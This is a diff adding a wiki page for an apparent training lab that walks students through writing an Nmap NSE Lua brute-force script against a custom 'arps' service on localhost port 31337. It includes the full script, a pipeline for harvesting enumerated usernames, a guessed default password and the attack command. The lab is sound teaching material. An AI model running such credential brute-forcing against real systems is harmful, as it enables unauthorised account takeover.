@@ -1,0 +1,180 @@
+created: 20230802035359203
+modified: 20230802040610791
+tags: 
+title: Lab 15 - Brute Force Those Users
+
+! Purpose
+
+Use Nmap to brute force some accounts on the system
+
+! Steps
+
+# Create the file `arps-brute.nse` and edit it with VS Code
+# Place the following at the top of the file:<span>
+
+```lua
+-- Script to bruteforce all users
+local stdnse = require "stdnse"
+local shortport = require "shortport"
+local arps = require "arps"
+
+-- New libraries we need to include
+local brute     = require "brute"
+local creds     = require "creds"
+local unpwdb    = require "unpwdb"
+
+portrule = shortport.port_or_service(31337, "arps")
+```
+</span>
+
+!!! Now we need to make our brute Driver:
+
+For sake of time I've created it for you, just copy and paste the following:
+
+```lua
+-- Brute Driver
+Driver = {
+    new = function(self, host, port)
+        local o = {}
+        setmetatable(o, self)
+        self.__index = self
+        o.host = host
+        o.port = port
+        -- Here we tell brute to create a new arps object
+        o.arps = arps.ARPS:new(brute.new_socket())
+        return o
+      end,
+      connect = function( self )
+        -- we then connect with this new object
+        local status, err = self.arps:initiate(self.host,self.port)
+        if not status then
+          stdnse.debug("Could not connect", err )
+          return false
+        end
+        return true
+      end,
+      disconnect = function( self )
+        return self.arps:disconnect()
+      end,
+      login = function( self, user, pass )
+        -- Finally we logon and check the results
+        stdnse.verbose(2,"Trying: " .. user .. "/" .. pass)
+        if self.arps:logon(user,pass) == user .. " is logged on" then
+            return true, creds.Account:new(user, pass, creds.State.VALID)
+        end
+        return false, brute.Error:new( "login failed" )
+      end,
+}
+```
+
+Then finally the action section:
+
+```lua
+action = function( host, port )
+    -- Create new Brute object with the driver
+    local engine = brute.Engine:new(Driver, host, port)
+
+    -- set the Brute obtions
+    engine.options.script_name = SCRIPT_NAME
+    engine.options:setTitle("ARPS Accounts")
+
+    -- Run the brute force
+    local status, result = engine:start()
+
+    -- Return the results
+    return result
+end
+```
+
+
+With all that done your script should look like this:
+
+```lua
+-- Script to bruteforce all users
+local stdnse = require "stdnse"
+local shortport = require "shortport"
+local arps = require "arps"
+
+-- New libraries we need to include
+local brute     = require "brute"
+local creds     = require "creds"
+local unpwdb    = require "unpwdb"
+
+portrule = shortport.port_or_service(31337, "arps")
+
+-- Brute Driver
+Driver = {
+    new = function(self, host, port)
+        local o = {}
+        setmetatable(o, self)
+        self.__index = self
+        o.host = host
+        o.port = port
+        -- Here we tell brute to create a new arps object
+        o.arps = arps.ARPS:new(brute.new_socket())
+        return o
+      end,
+      connect = function( self )
+        -- we then connect with this new object
+        local status, err = self.arps:initiate(self.host,self.port)
+        if not status then
+          stdnse.debug("Could not connect", err )
+          return false
+        end
+        return true
+      end,
+      disconnect = function( self )
+        return self.arps:disconnect()
+      end,
+      login = function( self, user, pass )
+        -- Finally we logon and check the results
+        stdnse.verbose(2,"Trying: " .. user .. "/" .. pass)
+        if self.arps:logon(user,pass) == user .. " is logged on" then
+            return true, creds.Account:new(user, pass, creds.State.VALID)
+        end
+        return false, brute.Error:new( "login failed" )
+      end,
+}
+
+action = function( host, port )
+    -- Create new Brute object with the driver
+    local engine = brute.Engine:new(Driver, host, port)
+
+    -- set the Brute obtions
+    engine.options.script_name = SCRIPT_NAME
+    engine.options:setTitle("ARPS Accounts")
+
+    -- Run the brute force
+    local status, result = engine:start()
+
+    -- Return the results
+    return result
+end
+```
+
+!! Users
+
+But we need a list of users!
+
+# Run the arps user enum script again: `./nmap/nmap -p 31337 localhost --script arps-enum`, look at all those users! But the format sucks
+# We need to extract just the users and put them in a file. We can do that with a little bash-fu: `./nmap/nmap localhost -p 31337 -sV --script arps-enum |grep "@"|awk '{print $2}' > arps_users.txt`
+# We also need a password, since we know the default password is month@year we'll try `aug@2023`: `echo 'aug@2023' > pass.txt`
+# Now we have everything we need to brute force some accounts: `./nmap/nmap --script arps-brute -p 31337 localhost --script-args "userdb=arps_users.txt,passdb=pass.txt" -d`
+
+Note: it will take a bit for the script to run, just leave it be! We've added the `-v` so we can see which account we're on.
+
+How many valid users did you find?
+
+!! BONUS:
+
+I also have it on good authority that some users may have used a password from [[this list|Passwords]], see if you can crack some more!
+
+
+!! ''BONUS BONUS:''
+
+Now that we have some valid users, can you edit the `arps-command-enum.nse` script to take two arguments, a username and a password, before passing the command to see which commands we have access to?
+
+Some tips:
+
+- You can pass the logon after connecting but before checking the command
+- We've already added one argument to that script, adding more should be easy
